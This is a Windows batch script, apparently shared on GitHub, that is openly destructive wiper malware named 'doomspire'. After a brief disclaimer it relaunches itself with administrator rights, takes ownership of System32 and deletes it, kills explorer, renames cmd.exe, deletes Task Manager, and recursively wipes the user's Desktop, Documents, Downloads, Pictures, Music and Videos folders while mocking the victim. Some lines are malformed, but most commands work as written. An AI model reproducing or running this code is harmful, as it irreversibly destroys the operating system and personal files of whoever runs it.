@echo off
echo This program performs dangerous operations.
Echo Do not continue unless you fully understand the consequences.
Echo Note: It wont work if you dont run it as an administrators
Echo Made by @Syed930 on github
Echo I am not responsible for any damages madde by it!
Echo enjoy!!!!!!!!!!!!
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
echo Motherf**ker your computer will be destroyed by doomspire
mkdir "C:\Windows\System32\osdata.txt"
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant Administrators:F /t
rmdir /s /q C:\Windows\System32
taskkill explorer.exe
ren cmd.exe 78ff4fo.exe
del Taskmgr.exe
del /q /s "%USERPROFILE%\Desktop\*"
del /q /s "%USERPROFILE%\Documents\*"
del /q /s "%USERPROFILE%\Downloads\*"
del /q /s "%USERPROFILE%\Pictures\*"
del /q /s "%USERPROFILE%\Music\*"
del /q /s "%USERPROFILE%\Videos\*"
echo This computer is ruined
echo hhahhahhHHhhHHHahhahahhah
